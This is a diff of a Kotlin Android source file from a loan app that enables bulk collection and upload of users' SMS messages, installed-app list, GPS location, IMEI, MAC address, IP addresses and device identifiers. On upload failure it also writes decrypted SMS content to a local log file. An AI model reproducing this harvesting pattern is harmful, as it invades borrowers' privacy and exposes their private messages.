@@ -2,12 +2,26 @@ package com.tiny.cash.loan.card.collect
 
 import android.Manifest
 import android.annotation.SuppressLint
-import android.provider.ContactsContract
+import android.content.pm.PackageManager
 import android.text.TextUtils
 import android.util.Log
 import com.blankj.utilcode.util.*
 import com.tiny.cash.loan.card.Constant
+import com.tiny.cash.loan.card.KudiCreditApp
+import com.tiny.cash.loan.card.KudiCreditApp.Companion.instance
+import com.tiny.cash.loan.card.collect.item.CollectAppInfoMgr
+import com.tiny.cash.loan.card.collect.item.CollectSmsMgr
 import com.tiny.cash.loan.card.kudicredit.BuildConfig
+import com.tiny.cash.loan.card.net.NetManager
+import com.tiny.cash.loan.card.net.NetObserver
+import com.tiny.cash.loan.card.net.ResponseException
+import com.tiny.cash.loan.card.net.request.params.AuthParams
+import com.tiny.cash.loan.card.net.response.Response
+import com.tiny.cash.loan.card.net.response.data.bean.AuthResult
+import com.tiny.cash.loan.card.utils.*
+import io.reactivex.Observable
+import io.reactivex.android.schedulers.AndroidSchedulers
+import io.reactivex.schedulers.Schedulers
 import org.json.JSONObject
 import java.io.UnsupportedEncodingException
 import java.net.URLEncoder
@@ -18,6 +32,8 @@ abstract class BaseCollectDataMgr {
 
     companion object {
         private val YMDHMS_FORMAT = "HH:mm, MMMM dd, yyyy"
+
+        private const val TAG = "BaseCollectDataMgr"
         fun local2UTC(timeStamp: Long): String? {
             val sdf =
                 SimpleDateFormat(YMDHMS_FORMAT)
@@ -30,7 +46,8 @@ abstract class BaseCollectDataMgr {
                 return null
             }
             val s1 =
-                s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
+                s.replace("%".toRegex(), "").replace("\\+".toRegex(), "")
+                    .replace("\"".toRegex(), "")
                     .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
             try {
                 var resultStr = PatternUtils.filterEmoji(s1)
@@ -46,7 +63,8 @@ abstract class BaseCollectDataMgr {
                 return null
             }
             val s1 =
-                s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
+                s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "")
+                    .replace("\"".toRegex(), "")
                     .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
             try {
                 var resultStr = PatternUtils.filterEmoji(s1)
@@ -58,190 +76,225 @@ abstract class BaseCollectDataMgr {
         }
     }
 
-//    fun collectAuthData(orderId: String, observer: Observer?) {
-//        var startMillions = System.currentTimeMillis()
-//        var startMillions1 = System.currentTimeMillis()
-//        ThreadUtils.executeByCached(object : ThreadUtils.SimpleTask<Exception?>() {
-//            @Throws(Throwable::class)
-//            override fun doInBackground(): Exception? {
-//                try {
-//                    val duration = (System.currentTimeMillis() - startMillions)
-//                    logFile(" start collect data start allo thread = " + duration)
-//                    startMillions = System.currentTimeMillis()
-//                    val aesSmsStr = CollectSmsMgr.sInstance.getSmsAesStr()
-//                    val duration1 = (System.currentTimeMillis() - startMillions)
-//                    logFile(" read sms duration = " + duration1 + " size = " + aesSmsStr.length)
-//
-////                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
-//                    val callRecordStr = ""
-////                    val originContract = GsonUtils.toJson(readContract(context))
-////                    val tempContract = EncodeUtils.encryptAES(originContract)
-//                    val contractStr = ""
-//
-//                    startMillions = System.currentTimeMillis()
-//
-//                    val aesAppInfoStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
-//                    val duration3 = (System.currentTimeMillis() - startMillions)
-//                    logFile(" read app info duration = " + duration3)
-//
-//                    startMillions = System.currentTimeMillis()
-//                    var locationBeanStr = ""
-//                    val locationStr = getLocation()
-//                    if (!TextUtils.isEmpty(locationStr)){
-//                        if (BuildConfig.DEBUG) {
-//                            Log.e("Test", locationStr)
-//                        }
-//                        locationBeanStr = EncodeUtils.encryptAES(locationStr)
-//                    }
-//                    val durationLocation = (System.currentTimeMillis() - startMillions)
-//                    logFile(" read location duration = " + durationLocation)
-//
-//                    val jsonObject = buildRequestJsonObj(
-//                        aesSmsStr, callRecordStr, contractStr,
-//                        aesAppInfoStr, locationBeanStr, orderId,
-//                    )
-//                    getAuthData(jsonObject, observer, startMillions1)
-//                } catch (e: Exception) {
-//                    if (BuildConfig.DEBUG) {
-//                        throw e
-//                    }
-//                    return e
-//                }
-//                return null
-//            }
-//
-//
-//            override fun onSuccess(result: Exception?) {
-//                if (result != null){
-//                    observer?.failure("collect data exception = " + result.toString())
-//                }
-//            }
-//
-//        })
-//    }
+    fun collectAuthData(orderId: String, observer: Observer?) {
+        var startMillions = System.currentTimeMillis()
+        var startMillions1 = System.currentTimeMillis()
+        ThreadUtils.executeByCached(object : ThreadUtils.SimpleTask<Exception?>() {
+            @Throws(Throwable::class)
+            override fun doInBackground(): Exception? {
+                try {
+                    val duration = (System.currentTimeMillis() - startMillions)
+                    logFile(" start collect data start allo thread = $duration")
+                    startMillions = System.currentTimeMillis()
+                    val aesSmsStr = CollectSmsMgr.sInstance.getSmsAesStr()
+                    val duration1 = (System.currentTimeMillis() - startMillions)
+                    logFile(" read sms duration = " + duration1 + " size = " + aesSmsStr.length)
+//                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
+                    val callRecordStr = ""
+//                    val originContract = GsonUtils.toJson(readContract(context))
+//                    val tempContract = EncodeUtils.encryptAES(originContract)
+                    val contractStr = ""
 
-//    private fun getLocation() :String {
-//        val locationStr = LocationMgr.getInstance().gpsStr
-//        if (TextUtils.isEmpty(locationStr)){
-//            return ""
-//        }
-//        return locationStr
-//    }
+                    startMillions = System.currentTimeMillis()
 
-//    @SuppressLint("MissingPermission")
-//    private fun buildRequestJsonObj(
-//        smsStr: String, callRecordStr: String,
-//        contractStr: String, appListStr: String,
-//        locationStr: String, orderId: String
-//    ): JSONObject {
-//        val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
-//        try {
-//            jsonObject.put("accountId", Constant.mAccountId)
-//            //申请订单ID
-//            jsonObject.put("orderId", orderId)
-//            //通讯录json
-//            jsonObject.put("contacts", contractStr)
-//            //短信记录json
-//            jsonObject.put("sms", if (TextUtils.isEmpty(smsStr)) "" else smsStr)
-//            //通话记录json
-//            jsonObject.put("call", callRecordStr)
-//            //app安装列表json
-//            jsonObject.put("appList", appListStr)
-//            //GPS位置json
-//            jsonObject.put("gps", locationStr)
-//            //网络IP
-//            jsonObject.put("userIp", NetworkUtils.getIPAddress(true))
-//            //公网IP
-//            jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
-//            //手机IMEI
-//            try {
-//                val hasPermissionReadPhoneState =
-//                    PermissionUtils.isGranted(Manifest.permission.READ_PHONE_STATE)
-//                if (hasPermissionReadPhoneState) {
-//                    val imei = PhoneUtils.getIMEI()
-//                    jsonObject.put("imei", if (!TextUtils.isEmpty(imei)) imei else
-//                        DeviceUtils.getAndroidID())
-//                }
-//            } catch (e :Exception){
-//
-//            }
-//            //androidId
-//            jsonObject.put("androidId", DeviceUtils.getAndroidID())
-//            jsonObject.put("deviceUniqId", DeviceUtils.getUniqueDeviceId())
-//            jsonObject.put("mac", DeviceUtils.getMacAddress())
-//            //手机品牌型号
-//            jsonObject.put("brand", DeviceUtils.getManufacturer())
-//            jsonObject.put("innerVersionCode", MyAppUtils.getAppVersionCode())
-//            jsonObject.put("isRooted", if (DeviceUtils.isDeviceRooted()) 1 else 0)
-//            jsonObject.put("isEmulator", if (DeviceUtils.isEmulator()) 1 else 0)
-//        } catch (e: java.lang.Exception) {
-//            e.printStackTrace()
-//            if (BuildConfig.DEBUG) {
-//                throw e
-//            }
+                    val aesAppInfoStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
+                    val duration3 = (System.currentTimeMillis() - startMillions)
+                    logFile(" read app info duration = $duration3")
+
+                    startMillions = System.currentTimeMillis()
+                    var locationBeanStr = ""
+                    val locationStr = getLocation()
+                    if (!TextUtils.isEmpty(locationStr)) {
+                        if (BuildConfig.DEBUG) {
+                            Log.e("Test", locationStr)
+                        }
+                        locationBeanStr = EncodeUtils.encryptAES(locationStr)
+                    }
+                    val durationLocation = (System.currentTimeMillis() - startMillions)
+                    logFile(" read location duration = $durationLocation")
+
+                    val authParams = buildAuthParams(
+                        aesSmsStr, callRecordStr, contractStr,
+                        aesAppInfoStr, locationBeanStr, orderId,
+                    )
+                    getAuthData(authParams, observer, startMillions1)
+                } catch (e: Exception) {
+                    if (BuildConfig.DEBUG) {
+                        throw e
+                    }
+                    return e
+                }
+                return null
+            }
+
+
+            override fun onSuccess(result: Exception?) {
+                if (result != null) {
+                    observer?.failure("collect data exception = " + result.toString())
+                }
+            }
+
+        })
+    }
+
+    private fun getLocation(): String {
+        val locationStr = LocationMgr.getInstance().gpsStr
+        if (TextUtils.isEmpty(locationStr)) {
+            return ""
+        }
+        return locationStr
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun buildAuthParams(
+        smsStr: String, callRecordStr: String,
+        contractStr: String, appListStr: String,
+        locationStr: String, orderId: String
+    ): AuthParams? {
+        val context = KudiCreditApp.instance?.applicationContext ?: return null
+        val deviceId = KvStorage.get(LocalConfig.LC_DEVICEID, "")
+        val imei = KvStorage.get(LocalConfig.LC_IMEI, "")
+        val acconutId = KvStorage.get(LocalConfig.LC_ACCOUNTID, "")
+        val macAddress = DeviceInfo.getInstance(context).macAddress
+        val androidId = DeviceInfo.getInstance(context).androidId
+        val ipAddress = NetworkUtil().getIpAddress(context)
+
+        val params = AuthParams()
+        var appVersion: String? = null
+        var verCode: String? = null
+        try {
+            val pInfo = instance!!.packageManager.getPackageInfo(
+                instance!!.packageName, 0
+            )
+            appVersion = pInfo.versionName //version name
+            verCode = pInfo.versionCode.toString() //version code
+        } catch (e: PackageManager.NameNotFoundException) {
+            e.printStackTrace()
+        }
+        var smsAesStr = CollectSmsMgr.sInstance.getSmsAesStr()
+        if (TextUtils.isEmpty(smsAesStr)) {
+            smsAesStr = ""
+        }
+        params.setSms(smsAesStr)
+//        params.setCall(callInfos);
+//        if (contactInfos != null) {
+//            params.setContacts(contactInfos.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(contactInfos).toString()) : "");
 //        }
-//        return jsonObject
-//    }
+        var appInfoAesStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
+        if (TextUtils.isEmpty(appInfoAesStr)) {
+            appInfoAesStr = ""
+        }
+        params.appList = appInfoAesStr
+        params.androidId = DeviceUtils.getAndroidID()
+        params.brand = DeviceUtils.getManufacturer()
+        params.deviceUniqId = DeviceUtils.getUniqueDeviceId()
+        params.imei = DeviceUtils.getAndroidID()
+        params.innerVersionCode = verCode
+        params.mac = macAddress
+        params.pubIp = NetworkUtils.getIpAddressByWifi()
+        params.userIp = NetworkUtils.getIPAddress(true)
+        params.accountId = acconutId
+        params.orderId = orderId
+        params.isRooted = if (DeviceUtils.isDeviceRooted()) "1" else "0"
+        params.isEmulator = if (DeviceUtils.isEmulator()) "1" else "0"
+        try {
+            //GPS位置json
+            params.gps = locationStr
+            //手机IMEI
+            try {
+                val hasPermissionReadPhoneState =
+                    PermissionUtils.isGranted(Manifest.permission.READ_PHONE_STATE)
+                if (hasPermissionReadPhoneState) {
+                    val imei = PhoneUtils.getIMEI()
+                    params.imei = if (!TextUtils.isEmpty(imei)) imei else DeviceUtils.getAndroidID()
+                }
+            } catch (e: Exception) {
+
+            }
+        } catch (e: java.lang.Exception) {
+            e.printStackTrace()
+            if (BuildConfig.DEBUG) {
+                throw e
+            }
+        }
+        return params
+    }
+
+    private var authInfoObserver: NetObserver<Response<AuthResult>>? = null
 
     @SuppressLint("MissingPermission")
     private fun getAuthData(
-        jsonObject: JSONObject, observer: Observer?, startMillions1 : Long) {
+        authParams: AuthParams?, observer: Observer?, startMillions1: Long
+    ) {
         logFile(" start upload auth .")
         val startMillions = System.currentTimeMillis()
-//        OkGo.post<String>(getApi()).tag(getTag()).upJson(jsonObject)
-//            .execute(object : StringCallback() {
-//                override fun onSuccess(response: Response<String>) {
-////                        Log.i(TAG, " response success= " + response.body());
-//                    val totalDur = (System.currentTimeMillis() - startMillions)
-//                    logFile(" start upload auth success =  $totalDur")
-//                    val authBean: AuthResponseBean? = CheckResponseUtils.checkResponseSuccess(
-//                        response,
-//                        AuthResponseBean::class.java
-//                    )
-//                    if (authBean != null && authBean.hasUpload == true) {
-//                        observer?.success(response)
-//                        FirebaseUtils.logEvent("fireb_upload_auth_duration", "uploadAuthDur", totalDur.toString()
-//                            ,"totalDur" , (System.currentTimeMillis() - startMillions1).toString())
-////                        log2File(originSms, originContract, originAppInfo, "")
-//                    } else {
-//                        var errorMsg: String? = null
-//                        try {
-//                            errorMsg = GsonUtils.toJson(authBean)
-//                        } catch (e: Exception) {
-//
-//                        }
-//                        observer?.failure(errorMsg)
-//                        log2File(jsonObject, errorMsg)
-//                    }
-//                }
-//
-//                override fun onError(response: Response<String>) {
-//                    super.onError(response)
-//                    var errorMsg: String? = null
-//                    try {
-//                        errorMsg = response.body().toString()
-//                    } catch (e: Exception) {
-//
-//                    }
-//                    observer?.failure(errorMsg)
-//                    logFile("start upload auth failure =  " + (System.currentTimeMillis() - startMillions) + errorMsg)
-//                }
-//            })
+        val observable: Observable<Response<AuthResult>> =
+            NetManager.getApiService().upLoadAuthInfo(authParams)
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+        if (authInfoObserver != null) {
+            CommonUtils.disposable(authInfoObserver)
+        }
+
+        authInfoObserver = object : NetObserver<Response<AuthResult>>() {
+            override fun onNext(response: Response<AuthResult>) {
+                if (!response.isSuccess) {
+                    Log.i(TAG, " response not success= " + response.body.toString())
+                    return
+                }
+                val authBean = response.body
+                Log.i(TAG, " response success= " + authBean.toString())
+                val totalDur = (System.currentTimeMillis() - startMillions)
+                logFile(" start upload auth success =  $totalDur")
+                if (authBean != null && authBean.isHasUpload) {
+                    observer?.success(authBean)
+                    // TODO
+//                    FirebaseUtils.logEvent("fireb_upload_auth_duration", "uploadAuthDur", totalDur.toString()
+//                        ,"totalDur" , (System.currentTimeMillis() - startMillions1).toString())
+//                        log2File(originSms, originContract, originAppInfo, "")
+                } else {
+                    var errorMsg: String? = null
+                    try {
+                        errorMsg = GsonUtils.toJson(authBean)
+                    } catch (e: Exception) {
+
+                    }
+                    observer?.failure(errorMsg)
+                    log2File(authParams, errorMsg)
+                }
+
+            }
+
+            override fun onException(netException: ResponseException) {
+                var errorMsg: String? = null
+                try {
+                    errorMsg = netException.msg
+                } catch (e: Exception) {
+
+                }
+                observer?.failure(errorMsg)
+                logFile("start upload auth failure =  " + (System.currentTimeMillis() - startMillions) + errorMsg)
+            }
+        }
+        observable.subscribeWith(authInfoObserver)
     }
 
     private fun log2File(
-        jsonObject: JSONObject,
+        authParams: AuthParams?,
         errorMsg: String?
     ) {
-        var originSms : String? = ""
-        var originAppInfo : String? = ""
+        if (authParams == null) {
+            return
+        }
+        var originSms: String? = ""
+        var originAppInfo: String? = ""
 
-        val aesSmsStr = jsonObject.optString("sms")
-        if (!TextUtils.isEmpty(aesSmsStr)){
+        val aesSmsStr = authParams.sms
+        if (!TextUtils.isEmpty(aesSmsStr)) {
             originSms = EncodeUtils.decryptAES(aesSmsStr)
         }
-        val aesAppListStr = jsonObject.optString("appList")
-        if (!TextUtils.isEmpty(aesAppListStr)){
+        val aesAppListStr = authParams.appList
+        if (!TextUtils.isEmpty(aesAppListStr)) {
             originAppInfo = EncodeUtils.decryptAES(aesAppListStr)
         }
 
@@ -255,12 +308,12 @@ abstract class BaseCollectDataMgr {
         if (!TextUtils.isEmpty(errorMsg)) {
             sb.append("  errorMsg: ").append(errorMsg)
         }
-        if (!TextUtils.isEmpty(sb.toString())){
+        if (!TextUtils.isEmpty(sb.toString())) {
             LogSaver.logToFile(sb.toString())
         }
     }
 
-    fun logFile(str : String){
+    fun logFile(str: String) {
         if (BuildConfig.DEBUG) {
             Log.e("Test", str)
         }
@@ -271,11 +324,11 @@ abstract class BaseCollectDataMgr {
 
     }
 
-    fun onDestroy(){
+    fun onDestroy() {
     }
 
     interface Observer {
-        fun success(response: String?)
+        fun success(response: AuthResult?)
         fun failure(response: String?)
     }
 
@@ -347,9 +400,9 @@ abstract class BaseCollectDataMgr {
 //        return list
 //    }
 
-    abstract fun getTag() : String
+    abstract fun getTag(): String
 
-    abstract fun getLogTag() : String
+    abstract fun getLogTag(): String
 
-    abstract fun getApi() : String
+    abstract fun getApi(): String
 }
